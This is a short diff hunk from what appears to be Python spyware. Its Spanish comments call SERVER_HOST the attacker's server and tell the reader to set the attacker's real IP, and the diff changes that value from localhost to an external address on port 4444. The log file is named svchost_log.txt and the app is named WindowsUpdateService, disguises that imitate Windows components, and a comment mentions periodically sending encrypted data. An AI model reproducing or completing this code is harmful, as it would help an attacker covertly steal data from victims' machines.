@@ -12,7 +12,7 @@ LOG_FILE = os.path.join(os.environ["APPDATA"], "svchost_log.txt")
 APP_NAME = "WindowsUpdateService"
 
 # IP y puerto del servidor del atacante
-SERVER_HOST = "127.0.0.1"   # Cambiar por la IP real del atacante
+SERVER_HOST = "195.0.1.5"   # Cambiar por la IP real del atacante
 SERVER_PORT = 4444
 
 # Intervalo en segundos entre cada envío de datos cifrados
